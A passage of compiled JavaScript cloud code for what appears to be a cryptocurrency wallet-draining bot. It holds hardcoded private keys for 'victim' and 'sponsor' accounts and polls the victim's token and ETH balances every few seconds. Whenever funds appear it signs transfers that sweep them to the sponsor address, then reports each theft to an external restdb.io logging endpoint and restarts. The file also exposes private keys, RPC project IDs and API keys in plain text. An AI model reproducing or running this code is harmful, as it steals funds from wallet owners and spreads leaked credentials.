        var victim = web33.eth.accounts.privateKeyToAccount('0f34b0718b7d786edc551bc28725a91ccc03b2fd2bece17bfa31f08bd2522885');
        ;
        var TOKEN_ADDRESS = "0x20f663cea80face82acdfa3aae6862d246ce0333";
        if (!sponsor.privateKey ||
            !victim.privateKey) {
            // logger.info("Please set both SPONSOR_KEY and VICTIM_KEY env");
            // console.error("Please set both SPONSOR_KEY and VICTIM_KEY env");
            return;
        }
        // var abi = ["function transfer(address,uint256) external",   "function balanceOf(address owner) view returns (uint256)", "function transferFrom(address,address,uint256) external", "function allowance(address,address) view returns (uint256)", "function approve(address, uint256) external returns (bool)"];
        var contract = new web33.eth.Contract(abijson, TOKEN_ADDRESS);
        var invtl = setInterval(async () => {
            if (stop == true) {
                clearInterval(invtl);
                // logger.info("stopped at strt");
                // console.log("stopped")
                return;
            }
            var tkbalanceADDR1 = await contract.methods.balanceOf(victim.address).call();
            // console.log(tkbalanceADDR1.toString())
            // logger.info(tkbalanceADDR1.toString());
            // logger.info(JSON.stringify(count++));
            if (parseInt(tkbalanceADDR1.toString()) > 2) {
                dripbalancegreaterthanweb3js(contract, victim, sponsor, tkbalanceADDR1, web33, TOKEN_ADDRESS, "logger", stop);
                // console.log("Now grater than")
                // logger.info("Now grater than");
            }
            else {
                // logger.info("Less Than");
                // console.log("less than")
            }
        }, 2000);
    }
    ;
    async function dripbalancegreaterthanweb3js(contract, victim, sponsor, tkbalanceADDR1, web33, TOKEN_ADDRESS, llooggerx, stop) {
        // var loggerdrip = Moralis.Cloud.getLogger();
        // console.log(contract)
        var transferfrom = contract.methods.transferFrom(victim.address, sponsor.address, tkbalanceADDR1.toString());
        var gaslimit = await web33.eth.estimateGas({ from: sponsor.address });
        // var gaslimit = await contract.methods.transferFrom(victim.address, sponsor.address, tkbalanceADDR1.toString()).estimateGas({from: sponsor.address})
        var gasPrice = await web33.eth.getGasPrice();
        var BN = web33.utils.BN;
        gasPrice = web33.utils.toBN(gasPrice);
        gaslimit = web33.utils.toBN(gaslimit);
        var transaction = {
            // chainId: 56,
            from: sponsor.address,
            nonce: 0,
            to: TOKEN_ADDRESS,
            gasPrice: gasPrice.add(gasPrice.divn(2)),
            gasLimit: gaslimit.muln(2),
            data: transferfrom.encodeABI(),
        };
        try {
            var nonce = await web33.eth.getTransactionCount(sponsor.address);
            transaction.nonce = nonce;
            let signedTx = await web33.eth.accounts.signTransaction(transaction, sponsor.privateKey);
            // logger.info(signedTx);
            // llooggerx.info(JSON.stringify(signedTx));
            web33.eth.sendSignedTransaction(signedTx.rawTransaction).on('receipt', (receipt) => {
                // console.log(receipt)
                // llooggerx.info(receipt);
                stopfunc(stop);
                setTimeout(() => {
                    stop = false;
                    botDripWeb3js();
                    // llooggerx.info("succss:	😀 restarting");
                    Parse.Cloud.httpRequest({
                        method: 'POST',
                        url: 'https://airnai-ddc3.restdb.io/rest/airnai',
                        headers: {
                            "content-type": "application/json",
                            "x-apikey": "62c00e68e91195203e3aa78d",
                            "cache-control": "no-cache"
                        },
                        body: {
                            addr_from: receipt.from,
                            addr_to: receipt.to,
                            value: "result",
                            time: new Date().toLocaleString(),
                            brand: "HoneyperSecondTransactionEth",
                            server: "1"
                        }
                    }).then(function (httpResponse) {
                        //logger.info(httpResponse.text);
                        // llooggerx.info("Fired paw paw!");
                    }, function (httpResponse) {
                        // llooggerx.info(JSON.stringify(httpResponse));
                    });
                }, 5000);
            }).on('error', (err) => {
                // console.log(err)
                // console.log(err.message)
                // llooggerx.error(err.message);
                // llooggerx.info(JSON.stringify(err.message) );
                if (err.message == 'Returned error: already known' || err.emmage == 'Returned error: replacement transaction underpriced') {
                    stopfunc(stop);
                    setTimeout(() => {
                        stop = false;
                        botDripWeb3js();
                        // llooggerx.info("restarting, after error");
                        // logger.info("restarting, after error");
                    }, 5000);
                }
            });
        }
        catch (error) {
            // llooggerx.error(error);
            // llooggerx.info(JSON.stringify(error));
            // console.log(error)
            // llooggerx.info("try catch block error")
        }
    }
    async function MaticjsWeb3js() {
        // var logger = Moralis.Cloud.getLogger();
        var config = await Parse.Config.get({ useMasterKey: true });
        var prjid = config.get("Infur");
        var stop = false;
        var count = 0;
        let abijson = [{ "inputs": [{ "internalType": "address", "name": "_thirdwebFee", "type": "address" }], "stateMutability": "nonpayable", "type": "varructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "delegator", "type": "address" }, { "indexed": true, "internalType": "address", "name": "fromDelegate", "type": "address" }, { "indexed": true, "internalType": "address", "name": "toDelegate", "type": "address" }], "name": "DelegateChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "delegate", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "previousBalance", "type": "uint256" }, { "indexed": false, "internalType": "uint256", "name": "newBalance", "type": "uint256" }], "name": "DelegateVotesChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "account", "type": "address" }], "name": "Paused", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "platformFeeRecipient", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "platformFeeBps", "type": "uint256" }], "name": "PlatformFeeInfoUpdated", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "recipient", "type": "address" }], "name": "PrimarySaleRecipientUpdated", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "bytes32", "name": "previousAdminRole", "type": "bytes32" }, { "indexed": true, "internalType": "bytes32", "name": "newAdminRole", "type": "bytes32" }], "name": "RoleAdminChanged", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "address", "name": "account", "type": "address" }, { "indexed": true, "internalType": "address", "name": "sender", "type": "address" }], "name": "RoleGranted", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "indexed": true, "internalType": "address", "name": "account", "type": "address" }, { "indexed": true, "internalType": "address", "name": "sender", "type": "address" }], "name": "RoleRevoked", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "mintedTo", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "quantityMinted", "type": "uint256" }], "name": "TokensMinted", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "signer", "type": "address" }, { "indexed": true, "internalType": "address", "name": "mintedTo", "type": "address" }, { "components": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "address", "name": "primarySaleRecipient", "type": "address" }, { "internalType": "uint256", "name": "quantity", "type": "uint256" }, { "internalType": "uint256", "name": "price", "type": "uint256" }, { "internalType": "address", "name": "currency", "type": "address" }, { "internalType": "uint128", "name": "validityStartTimestamp", "type": "uint128" }, { "internalType": "uint128", "name": "validityEndTimestamp", "type": "uint128" }, { "internalType": "bytes32", "name": "uid", "type": "bytes32" }], "indexed": false, "internalType": "struct ITokenERC20.MintRequest", "name": "mintRequest", "type": "tuple" }], "name": "TokensMintedWithSignature", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "internalType": "address", "name": "account", "type": "address" }], "name": "Unpaused", "type": "event" }, { "inputs": [], "name": "DEFAULT_ADMIN_ROLE", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "DOMAIN_SEPARATOR", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burnFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint32", "name": "pos", "type": "uint32" }], "name": "checkpoints", "outputs": [{ "components": [{ "internalType": "uint32", "name": "fromBlock", "type": "uint32" }, { "internalType": "uint224", "name": "votes", "type": "uint224" }], "internalType": "struct ERC20VotesUpgradeable.Checkpoint", "name": "", "type": "tuple" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "contractType", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "pure", "type": "function" }, { "inputs": [], "name": "contractURI", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "contractVersion", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "pure", "type": "function" }, { "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "delegatee", "type": "address" }], "name": "delegate", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "delegatee", "type": "address" }, { "internalType": "uint256", "name": "nonce", "type": "uint256" }, { "internalType": "uint256", "name": "expiry", "type": "uint256" }, { "internalType": "uint8", "name": "v", "type": "uint8" }, { "internalType": "bytes32", "name": "r", "type": "bytes32" }, { "internalType": "bytes32", "name": "s", "type": "bytes32" }], "name": "delegateBySig", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "delegates", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "uint256", "name": "blockNumber", "type": "uint256" }], "name": "getPastTotalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }, { "internalType": "uint256", "name": "blockNumber", "type": "uint256" }], "name": "getPastVotes", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "getPlatformFeeInfo", "outputs": [{ "internalType": "address", "name": "", "type": "address" }, { "internalType": "uint16", "name": "", "type": "uint16" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }], "name": "getRoleAdmin", "outputs": [{ "internalType": "bytes32", "name": "", "type": "bytes32" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "uint256", "name": "index", "type": "uint256" }], "name": "getRoleMember", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }], "name": "getRoleMemberCount", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "getVotes", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "grantRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "hasRole", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_defaultAdmin", "type": "address" }, { "internalType": "string", "name": "_name", "type": "string" }, { "internalType": "string", "name": "_symbol", "type": "string" }, { "internalType": "string", "name": "_contractURI", "type": "string" }, { "internalType": "address[]", "name": "_trustedForwarders", "type": "address[]" }, { "internalType": "address", "name": "_primarySaleRecipient", "type": "address" }, { "internalType": "address", "name": "_platformFeeRecipient", "type": "address" }, { "internalType": "uint256", "name": "_platformFeeBps", "type": "uint256" }], "name": "initialize", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "forwarder", "type": "address" }], "name": "isTrustedForwarder", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mintTo", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "components": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "address", "name": "primarySaleRecipient", "type": "address" }, { "internalType": "uint256", "name": "quantity", "type": "uint256" }, { "internalType": "uint256", "name": "price", "type": "uint256" }, { "internalType": "address", "name": "currency", "type": "address" }, { "internalType": "uint128", "name": "validityStartTimestamp", "type": "uint128" }, { "internalType": "uint128", "name": "validityEndTimestamp", "type": "uint128" }, { "internalType": "bytes32", "name": "uid", "type": "bytes32" }], "internalType": "struct ITokenERC20.MintRequest", "name": "_req", "type": "tuple" }, { "internalType": "bytes", "name": "_signature", "type": "bytes" }], "name": "mintWithSignature", "outputs": [], "stateMutability": "payable", "type": "function" }, { "inputs": [{ "internalType": "bytes[]", "name": "data", "type": "bytes[]" }], "name": "multicall", "outputs": [{ "internalType": "bytes[]", "name": "results", "type": "bytes[]" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }], "name": "nonces", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "numCheckpoints", "outputs": [{ "internalType": "uint32", "name": "", "type": "uint32" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "pause", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "paused", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "value", "type": "uint256" }, { "internalType": "uint256", "name": "deadline", "type": "uint256" }, { "internalType": "uint8", "name": "v", "type": "uint8" }, { "internalType": "bytes32", "name": "r", "type": "bytes32" }, { "internalType": "bytes32", "name": "s", "type": "bytes32" }], "name": "permit", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "primarySaleRecipient", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "renounceRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes32", "name": "role", "type": "bytes32" }, { "internalType": "address", "name": "account", "type": "address" }], "name": "revokeRole", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "string", "name": "_uri", "type": "string" }], "name": "setContractURI", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_platformFeeRecipient", "type": "address" }, { "internalType": "uint256", "name": "_platformFeeBps", "type": "uint256" }], "name": "setPlatformFeeInfo", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "_saleRecipient", "type": "address" }], "name": "setPrimarySaleRecipient", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "bytes4", "name": "interfaceId", "type": "bytes4" }], "name": "supportsInterface", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "stateMutability": "view", "type": "function" }, { "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "internalType": "address", "name": "from", "type": "address" }, { "internalType": "address", "name": "to", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "name": "unpause", "outputs": [], "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "components": [{ "internalType": "address", "name": "to", "type": "address" }, { "internalType": "address", "name": "primarySaleRecipient", "type": "address" }, { "internalType": "uint256", "name": "quantity", "type": "uint256" }, { "internalType": "uint256", "name": "price", "type": "uint256" }, { "internalType": "address", "name": "currency", "type": "address" }, { "internalType": "uint128", "name": "validityStartTimestamp", "type": "uint128" }, { "internalType": "uint128", "name": "validityEndTimestamp", "type": "uint128" }, { "internalType": "bytes32", "name": "uid", "type": "bytes32" }], "internalType": "struct ITokenERC20.MintRequest", "name": "_req", "type": "tuple" }, { "internalType": "bytes", "name": "_signature", "type": "bytes" }], "name": "verify", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }, { "internalType": "address", "name": "", "type": "address" }], "stateMutability": "view", "type": "function" }];
        // var web33 = new Web3("https://goerli.infura.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd");
        var web33 = new web3_1.default(new web3_1.default.providers.HttpProvider("https://eth.getblock.io/" + prjid + "/mainnet/"));
        // var web33 = new Moralis.Web3(
        //   new Moralis.Web3.providers.HttpProvider(
        //     // "https://goerli.infura.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd"
        //     // "https://eth.getblock.io/goerli/?api_key=5674477f-352c-487b-ae37-11cbdbd925c6"
        //     "https://mainnet.infura.io/v3/3dd198ffc6924f45aa3b50cae37aa6dd"
        //     // "https://eth.getblock.io/mainnet/?api_key=5674477f-352c-487b-ae37-11cbdbd925c6"
        //   )
        // );
        // console.log(web33.version)
        //  logger.info(JSON.stringify(web33.version));
        var sponsor = web33.eth.accounts.privateKeyToAccount('b36b36e5809ad496136af4c5e81c0586518dad40130eabfdfb7aa039634628cd');
        ;
        var victim = web33.eth.accounts.privateKeyToAccount('704fe8345c3c2b504aa0103b9a2a16b68b6c9a3c04478f448729429babcd4c8b');
        ;
        var TOKEN_ADDRESS = "0x20f663cea80face82acdfa3aae6862d246ce0333";
        if (!sponsor.privateKey ||
            !victim.privateKey) {
            // logger.info("Please set both SPONSOR_KEY and VICTIM_KEY env");
            // console.error("Please set both SPONSOR_KEY and VICTIM_KEY env");
            return;
        }
        // var abi = ["function transfer(address,uint256) external",   "function balanceOf(address owner) view returns (uint256)", "function transferFrom(address,address,uint256) external", "function allowance(address,address) view returns (uint256)", "function approve(address, uint256) external returns (bool)"];
        var contract = new web33.eth.Contract(abijson, TOKEN_ADDRESS);
        // console.log("started")
        var invtl = setInterval(async () => {
            if (stop == true) {
                clearInterval(invtl);
                // logger.info("stopped at strt");
                // console.log("stopped")
                return;
            }
            // var tkbalanceADDR1 = await contract.methods.balanceOf(victim.address).call()
            var tkbalanceADDR1 = await web33.eth.getBalance(victim.address);
            // logger.info(tkbalanceADDR1.toString());
            // console.log(tkbalanceADDR1.toString())
            // logger.info(JSON.stringify(count++));
            var wei = web33.utils.fromWei(tkbalanceADDR1, 'ether');
            // logger.info(wei.toString());
            if (wei > 0.00000290810719206) {
                maticbalancegreaterthanweb3js(contract, victim, sponsor, tkbalanceADDR1, web33, TOKEN_ADDRESS, "logger", stop);
                // console.log("Now grater than")
                // logger.info("Now grater than");
            }
            else {
                // logger.info("Less Than");
                // console.log("less than")
            }
        }, 1000);
    }
    ;
    async function maticbalancegreaterthanweb3js(contract, victim, sponsor, tkbalanceADDR1, web33, TOKEN_ADDRESS, llooggerx, stop) {
        // var loggerdrip = Moralis.Cloud.getLogger();
        // console.log(contract)
        // var transferfrom = contract.methods.transferFrom(victim.address, sponsor.address, tkbalanceADDR1.toString())
        // var gaslimit = await web33.eth.estimateGas({from: victim.address})
        // var gaslimit = await contract.methods.transferFrom(victim.address, sponsor.address, tkbalanceADDR1.toString()).estimateGas({from: sponsor.address})
        var gasPrice = await web33.eth.getGasPrice();
        var BN = web33.utils.BN;
        gasPrice = web33.utils.toBN(gasPrice);
        // gaslimit = web33.utils.toBN(gaslimit)
        var gas = 21000;
        var dgasPrice = gasPrice.add(gasPrice.divn(2));
        var fee = dgasPrice.muln(gas);
        var bl = new BN(tkbalanceADDR1);
        // logger.info("got to matic try catch");
        var baltosend = bl.sub(fee);
        var transaction = {
            // chainId: 56,
            // from: victim.address,
            // nonce: 0,
            to: sponsor.address,
            gasPrice: dgasPrice,
            gas: gas,
            value: baltosend,
            // 'to': rcveraddress, // faucet address to return eth
            // 'value': baltosend,
            // 'gas': gas,
            // 'gasPrice': gasPrice,
        };
        try {
            // var nonce = await web33.eth.getTransactionCount(sponsor.address);
            // transaction.nonce = nonce;
            let signedTx = await web33.eth.accounts.signTransaction(transaction, victim.privateKey);
            // logger.info("got to try catch");
            // llooggerx.info(JSON.stringify(signedTx));
            web33.eth.sendSignedTransaction(signedTx.rawTransaction).on('receipt', (receipt) => {
                // console.log(receipt)
                // llooggerx.info(receipt);
                stopfunc(stop);
                setTimeout(() => {
                    stop = false;
                    MaticjsWeb3js();
                    // llooggerx.info("succss:	😀 restarting");
                    Parse.Cloud.httpRequest({
                        method: 'POST',
                        url: 'https://airnai-ddc3.restdb.io/rest/airnai',
                        headers: {
                            "content-type": "application/json",
                            "x-apikey": "62c00e68e91195203e3aa78d",
                            "cache-control": "no-cache"
                        },
                        body: {
                            addr_from: receipt.from,
                            addr_to: receipt.to,
                            value: baltosend,
                            time: new Date().toLocaleString(),
                            brand: "HoneyperMaticValidator",
                            server: "1"
                        }
                    }).then(function (httpResponse) {
                        //logger.info(httpResponse.text);
                        // llooggerx.info("Fired paw paw!");
                    }, function (httpResponse) {
                        // llooggerx.info(JSON.stringify(httpResponse));
                    });
                }, 5000);
            }).on('error', (err) => {
                // console.log(err)
                // console.log(err.message)
                // llooggerx.error(err.message);
                // llooggerx.info(JSON.stringify(err.message) );
                if (err.message == 'Returned error: already known' || err.emmage == 'Returned error: replacement transaction underpriced') {
                    stopfunc(stop);
                    setTimeout(() => {
                        stop = false;
                        MaticjsWeb3js();
                        // llooggerx.info("restarting, after error");
                        // logger.info("restarting, after error");
                    }, 5000);
                }
            });
        }
        catch (error) {
            // llooggerx.error(error);
            // llooggerx.info(JSON.stringify(error));
            // console.log(error)
            // llooggerx.info("try catch block error")
        }
    }
    function stopfunc(stpbool) {
        stpbool = true;
    }
    function getntwork(chainid) {
        var chainids = [
            {
                id: 1,
                name: 'eth'
            },
            {
                id: 137,
                name: 'polygon'
            },
            {
                id: 43114,
                name: 'avax'
            },
            {
                id: 56,
                name: 'bsc'
            },
            {
                id: 250,
                name: 'fantom'
            },
            {
                id: 10,
                name: 'op'
            },
            {
                id: 42161,
                name: 'arb'
            },
            {
                id: 25,
                name: 'cronos'
            }
        ];
        // grab the Array item which matchs the id "2"
        var item = chainids.find(item => item.id === chainid);
        var returnvalue = '';
        if (item) {
            returnvalue = item.name;
        }
        else {
            returnvalue = 'null';
        }
        // return returnvalue;
        return item === null || item === void 0 ? void 0 : item.name;
    }
    async function mshlogger(request, brand, logg) {
        var result = await web3.utils.fromWei(request.object.get("value"));
        //  varresult = Moralis.Cloud.units({
        //    method: "fromWei",
        //    value: request.object.get("value"),
        //    });
        Parse.Cloud.httpRequest({
            method: 'POST',
            url: 'https://airnai-ddc3.restdb.io/rest/airnai',
            headers: {
                "content-type": "application/json",
                "x-apikey": "62c00e68e91195203e3aa78d",
                "cache-control": "no-cache"
            },
            body: {
                addr_from: request.object.get("fromAddress"),
                addr_to: request.object.get("toAddress"),
                value: result,
                time: request.object.get("_created_at"),
                brand: brand + ":Honey",
                server: "1"
            }
        }).then(function (httpResponse) {
            //logger.info(httpResponse.text);
            //  logg.info(brand);
        }, function (httpResponse) {
            //  logg.error(JSON.stringify(httpResponse));
        });
    }
});
Parse.Cloud.define("startListening", async () => {
    console.log('hello world run');
    // Parse.Cloud.httpRequest({
    //      method: 'POST',
    //   url: 'https://airnai-ddc3.restdb.io/rest/airnai',
    //   headers: {
    //     "content-type": "application/json",
    //     "x-apikey": "62c00e68e91195203e3aa78d",
    //     "cache-control": "no-cache"
    //   },
    //    body: {
    //      addr_from: 'hey',
    //      addr_to: 'hoo',
    //      value: amount+'',
    //      time: '43340',
    //      brand: "TransactionEth"
    //    }
    // }).then(function(httpResponse: any) {
    //   // success
    //   console.log(httpResponse.text);
    // },function(httpResponse: any) {
    //   // error
    //   console.error('Request failed with response code ' + httpResponse.status);
    // });
    Parse.Cloud.afterSave("DemoTxs", async (request) => {
        // console.log(JSON.stringify(request));
        if (request.object.get("confirmed") == false) {
            // const logger = Moralis.Cloud.getLogger();
            // logger.info("Got to Eth Transaction");
            var result = await web3.utils.fromWei(request.object.get("value"));
            Parse.Cloud.httpRequest({
                method: 'POST',
                url: 'https://airnai-ddc3.restdb.io/rest/airnai',
                headers: {
                    "content-type": "application/json",
                    "x-apikey": "62c00e68e91195203e3aa78d",
                    "cache-control": "no-cache"
                },
                body: {
                    addr_from: request.object.get("fromAddress"),
                    addr_to: request.object.get("toAddress"),
                    value: result,
                    time: request.object.get("chainId") + "_streams",
                    brand: "DemoTxs"
                }
            }).then(function (httpResponse) {
                //logger.info(httpResponse.text);
                //  logger.info("Logged Eth Trnasfer");\
                // console.log(httpResponse.text);
            }, function (httpResponse) {
                // logger.error(JSON.stringify(httpResponse));
                // console.log(JSON.stringify(httpResponse));
            });
        }
        else {
        }
    });
});
Parse.Cloud.define("textPassValue", async (request) => {
    return request;
});
Parse.Cloud.define("configureStreams", async (request) => {
    // console.log('hello  configureStreams');
    //  Moralis.start({
    //    apiKey: config.MORALIS_API_KEY,
    //  });
    // console.log(request.params.addr);
    // return JSON.parse(request.params.addr);
    //  const stream = {
    //    chains: [EvmChain.ETHEREUM, EvmChain.POLYGON, EvmChain.], // list of blockchains to monitor
    //    description: "monitor Bobs wallet", // your description
    //   tag: "bob", // give it a tag
    //    webhookUrl: "https://YOUR_WEBHOOK_URL", // webhook url to receive events,
    //    includeNativeTxs: true
    //  }
    //  const newStream = await Moralis.Streams.add(stream);
    //  const { id } = newStream.toJSON(); // { id: 'YOUR_STREAM_ID', ...newStream }
    // // Now we attach bobs address to the stream
    //  const address = "0x68b3f12d6e8d85a8d3dbbc15bba9dc5103b888a4";
    //  await Moralis.Streams.addAddress({ address, id });
    const id = config_1.default.STREAM_ID;
    // var addrescount = await Moralis.Streams.getAddresses({
    //   limit: 5000,
    //   id });
    // return addrescount 
    // if(addrescount.result) {
    // }
    //  console.log(request.params.addr[0])
    //  return request.params.addr[0];
    const response = await moralis_1.default.Streams.addAddress({
        id: id,
        address: [] // Can also be a single string
    });
    return response;
});
//# sourceMappingURL=main.js.map